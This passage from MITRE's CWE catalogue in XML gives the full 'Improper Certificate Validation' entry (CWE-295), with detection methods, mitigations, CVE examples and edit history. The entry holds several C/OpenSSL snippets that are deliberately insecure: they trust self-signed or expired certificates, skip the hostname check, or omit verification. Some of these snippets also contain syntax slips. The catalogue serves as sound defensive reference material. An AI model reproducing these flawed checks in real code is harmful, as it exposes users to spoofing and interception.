					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-12-10</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-03-15</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Alternate_Terms, Demonstrative_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-07-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-10-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-06-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Observed_Examples, References, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-01-31</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description, Maintenance_Notes, Observed_Examples, Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples, References, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
            <ns0:Previous_Entry_Name Date="2008-04-11">Authentication Issues</ns0:Previous_Entry_Name>
            <ns0:Previous_Entry_Name Date="2009-01-12">Insufficient Authentication</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="295" Name="Improper Certificate Validation" Abstraction="Base" Structure="Simple" Status="Draft">
         <ns0:Description>The product does not validate, or incorrectly validates, a certificate.</ns0:Description>
         <ns0:Extended_Description>When a certificate is invalid or malicious, it might allow an attacker to spoof a trusted entity by interfering in the communication path between the host and client. The product might connect to a malicious host while believing it is a trusted host, or the product might be deceived into accepting spoofed data that appears to originate from a trusted host.</ns0:Extended_Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="PeerOf" CWE_ID="322" View_ID="1000" />
         </ns0:Related_Weaknesses>
         <ns0:Applicable_Platforms>
            <ns0:Language Class="Not Language-Specific" Prevalence="Undetermined" />
            <ns0:Technology Class="Mobile" Prevalence="Undetermined" />
         </ns0:Applicable_Platforms>
         <ns0:Background_Details>
            <ns0:Background_Detail>A certificate is a token that associates an identity (principal) to a cryptographic key. Certificates can be used to check if a public key belongs to the assumed owner.</ns0:Background_Detail>
         </ns0:Background_Details>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Architecture and Design</ns0:Phase>
            </ns0:Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</ns0:Note>
            </ns0:Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Note>When the product uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete.</ns0:Note>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Authentication</ns0:Scope>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
               <ns0:Impact>Gain Privileges or Assume Identity</ns0:Impact>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis - Binary or Bytecode</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</html:li>
                           <html:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Manual Static Analysis - Binary or Bytecode</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Dynamic Analysis with Automated Results Interpretation</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Web Application Scanner</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Dynamic Analysis with Manual Results Interpretation</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Man-in-the-middle attack tool</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Manual Static Analysis - Source Code</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Focused Manual Spotcheck - Focused manual analysis of source</html:li>
                           <html:li>Manual Source Code Review (not inspections)</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis - Source Code</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Source code Weakness Analyzer</html:li>
                           <html:li>Context-configured Source Code Weakness Analyzer</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Architecture or Design Review</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Certificates should be carefully managed and checked to assure that data are encrypted with the intended owner's public key.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the hostname.</ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-121">
               <ns0:Intro_Text>This code checks the certificate of a connected peer.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>if ((cert = SSL_get_peer_certificate(ssl)) &amp;&amp; host)<html:div style="margin-left:1em;">foo=SSL_get_verify_result(ssl);</html:div>
                     <html:br />if ((X509_V_OK==foo) || X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN==foo))<html:div style="margin-left:1em;">
                        <html:div>
                           <html:br />
                           <html:i>// certificate looks good, host can be trusted</html:i>
                           <html:br />
                        </html:div>
                     </html:div>
                  </html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>In this case, because the certificate is self-signed, there was no external authority that could prove the identity of the host. The program could be communicating with a different system that is spoofing the host, e.g. by poisoning the DNS cache or using an Adversary-in-the-Middle (AITM) attack to modify the traffic from server to client.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-122">
               <ns0:Intro_Text>The following OpenSSL code obtains a certificate and verifies it.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>cert = SSL_get_peer_certificate(ssl);<html:br />if (cert &amp;&amp; (SSL_get_verify_result(ssl)==X509_V_OK)) {<html:div style="margin-left:1em;">
                        <html:div>
                           <html:br />
                           <html:i>// do secret things</html:i>
                           <html:br />
                        </html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>Even though the "verify" step returns X509_V_OK, this step does not include checking the Common Name against the name of the host. That is, there is no guarantee that the certificate is for the desired host. The SSL connection could have been established with a malicious host that provided a valid certificate.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-123">
               <ns0:Intro_Text>The following OpenSSL code ensures that there is a certificate and allows the use of expired certificates.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>if (cert = SSL_get_peer(certificate(ssl)) {<html:div style="margin-left:1em;">
                        <html:div>foo=SSL_get_verify_result(ssl);<html:br />if ((X509_V_OK==foo) || (X509_V_ERR_CERT_HAS_EXPIRED==foo))<html:div style="margin-left:1em;">
                              <html:div>
                                 <html:br />
                                 <html:i>//do stuff</html:i>
                                 <html:br />
                              </html:div>
                           </html:div>
                        </html:div>
                     </html:div>
                  </html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>If the call to SSL_get_verify_result() returns X509_V_ERR_CERT_HAS_EXPIRED, this means that the certificate has expired. As time goes on, there is an increasing chance for attackers to compromise the certificate.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-124">
               <ns0:Intro_Text>The following OpenSSL code ensures that there is a certificate before continuing execution.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>if (cert = SSL_get_peer_certificate(ssl)) {<html:div style="margin-left:1em;">
                        <html:div>
                           <html:br />
                           <html:i>// got a certificate, do secret things</html:i>
                           <html:br />
                        </html:div>
                     </html:div>
                  </html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>Because this code does not use SSL_get_verify_results() to check the certificate, it could accept certificates that have been revoked (X509_V_ERR_CERT_REVOKED). The software could be communicating with a malicious host.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-125">
               <ns0:Intro_Text>The following OpenSSL code ensures that the host has a certificate.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>if (cert = SSL_get_peer_certificate(ssl)) {<html:div style="margin-left:1em;">
                        <html:div>
                           <html:br />
                           <html:i>// got certificate, host can be trusted</html:i>
                           <html:br />
                           <html:br />
                           <html:i>//foo=SSL_get_verify_result(ssl);</html:i>
                           <html:br />
                           <html:br />
                           <html:i>//if (X509_V_OK==foo) ...</html:i>
                           <html:br />
                        </html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>Note that the code does not call SSL_get_verify_result(ssl), which effectively disables the validation step that checks the certificate.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2019-12496</ns0:Reference>
               <ns0:Description>A Go framework for robotics, drones, and IoT devices skips verification of root CA certificates by default.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2019-12496</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2014-1266</ns0:Reference>
               <ns0:Description>chain: incorrect "goto" in Apple SSL product bypasses certificate validation, allowing Adversary-in-the-Middle (AITM) attack (Apple "goto fail" bug). CWE-705 (Incorrect Control Flow Scoping) -&gt; CWE-561 (Dead Code) -&gt; CWE-295 (Improper Certificate Validation) -&gt; CWE-393 (Return of Wrong Status Code) -&gt; CWE-300 (Channel Accessible by Non-Endpoint).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2014-1266</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-22909</ns0:Reference>
               <ns0:Description>Chain: router's firmware update procedure uses curl with "-k" (insecure) option that disables certificate validation (CWE-295), allowing adversary-in-the-middle (AITM) compromise with a malicious firmware image (CWE-494).</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-22909</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-4989</ns0:Reference>
               <ns0:Description>Verification function trusts certificate chains in which the last certificate is self-signed.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-4989</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2012-5821</ns0:Reference>
               <ns0:Description>Web browser uses a TLS-related function incorrectly, preventing it from verifying that a server's certificate is signed by a trusted certification authority (CA)</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2012-5821</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-3046</ns0:Reference>
               <ns0:Description>Web browser does not check if any intermediate certificates are revoked.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-3046</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2011-0199</ns0:Reference>
               <ns0:Description>Operating system does not check Certificate Revocation List (CRL) in some cases, allowing spoofing using a revoked certificate.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2011-0199</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2012-5810</ns0:Reference>
               <ns0:Description>Mobile banking application does not verify hostname, leading to financial loss.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2012-5810</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2012-3446</ns0:Reference>
               <ns0:Description>Cloud-support library written in Python uses incorrect regular expression when matching hostname.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2012-3446</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2408</ns0:Reference>
               <ns0:Description>Web browser does not correctly handle '\0' character (NUL) in Common Name, allowing spoofing of https sites.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2408</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2012-2993</ns0:Reference>
               <ns0:Description>Smartphone device does not verify hostname, allowing spoofing of mail services.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2012-2993</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2012-5822</ns0:Reference>
               <ns0:Description>Application uses third-party library that does not validate hostname.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2012-5822</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2012-5819</ns0:Reference>
               <ns0:Description>Cloud storage management application does not validate hostname.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2012-5819</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2012-5817</ns0:Reference>
               <ns0:Description>Java library uses JSSE SSLSocket and SSLEngine classes, which do not verify the hostname.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2012-5817</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2010-1378</ns0:Reference>
               <ns0:Description>chain: incorrect calculation allows attackers to bypass certificate checks.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2010-1378</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-3170</ns0:Reference>
               <ns0:Description>LDAP client accepts certificates even if they are not from a trusted CA.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-3170</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-0265</ns0:Reference>
               <ns0:Description>chain: DNS server does not correctly check return value from the OpenSSL EVP_VerifyFinal function allows bypass of validation of the certificate chain.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-0265</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2003-1229</ns0:Reference>
               <ns0:Description>chain: product checks if client is trusted when it intended to check if the server is trusted, allowing validation of signed code.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2003-1229</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-0862</ns0:Reference>
               <ns0:Description>Cryptographic API, as used in web browsers, mail clients, and other software, does not properly validate Basic Constraints.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-0862</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-1358</ns0:Reference>
               <ns0:Description>chain: OS package manager does not check properly check the return value, allowing bypass using a revoked certificate.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-1358</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <ns0:Entry_ID>A10</ns0:Entry_ID>
               <ns0:Entry_Name>Insecure Configuration Management</ns0:Entry_Name>
               <ns0:Mapping_Fit>CWE More Specific</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern CAPEC_ID="459" />
            <ns0:Related_Attack_Pattern CAPEC_ID="475" />
         </ns0:Related_Attack_Patterns>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-243" />
            <ns0:Reference External_Reference_ID="REF-244" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Allowed</ns0:Usage>
            <ns0:Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</ns0:Rationale>
            <ns0:Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Acceptable-Use" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Content_History>
            <ns0:Submission>
                <ns0:Submission_Name>CWE Community</ns0:Submission_Name>
                <ns0:Submission_Date>2006-07-19</ns0:Submission_Date>
                <ns0:Submission_Version>Draft 3</ns0:Submission_Version>
                <ns0:Submission_ReleaseDate>2006-07-19</ns0:Submission_ReleaseDate>
				<ns0:Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</ns0:Submission_Comment>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Organization>Veracode</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-08-15</ns0:Modification_Date>
               <ns0:Modification_Comment>Suggested OWASP Top Ten 2004 mapping</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-10-14</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Background_Details, Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-12-28</ns0:Modification_Date>
               <ns0:Modification_Importance>Critical</ns0:Modification_Importance>
               <ns0:Modification_Comment>Converted from category to weakness class.</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2013-02-21</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description, Name, Observed_Examples, Potential_Mitigations, References, Relationships, Time_of_Introduction, Type</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-06-23</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Observed_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Detection_Factors</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-19</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Modes_of_Introduction, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-03-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Background_Details, Modes_of_Introduction, Potential_Mitigations, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-06-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-09-19</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-08-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-07-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples, Observed_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-10-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-04-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples, References</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-01-31</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description, Modes_of_Introduction</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes</ns0:Modification_Comment>
				</ns0:Modification>
            <ns0:Previous_Entry_Name Date="2013-02-21">Certificate Issues</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="400" Name="Uncontrolled Resource Consumption" Abstraction="Class" Structure="Simple" Status="Draft">
